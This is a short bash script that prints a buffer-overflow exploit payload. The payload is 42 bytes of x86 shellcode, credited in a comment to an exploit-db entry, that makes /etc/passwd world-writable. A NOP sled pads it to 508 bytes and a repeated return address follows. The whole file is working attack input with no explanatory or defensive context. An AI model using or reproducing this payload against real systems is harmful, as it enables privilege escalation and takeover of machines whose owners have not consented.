#!/bin/bash

#https://www.exploit-db.com/exploits/37390/
#42 bytes
#chmod 777 /etc/passwd

echo -ne "\x6a\x0f\x58\x68\x90\x90\xff\x01\x59\xc1\xe9\x10\x68\x90\x73\x77\x64\x5b\xc1\xeb\x08\x53\x68\x2f\x70\x61\x73\x68\x2f\x65\x74\x63\x89\xe3\xcd\x80\xb0\x01\xb3\x01\xcd\x80"

for i in $(seq 43 508)
do
   echo -ne "\x90"
done

for i in 1 2
do
    echo -ne "\x0c\xd4\xff\xff"
done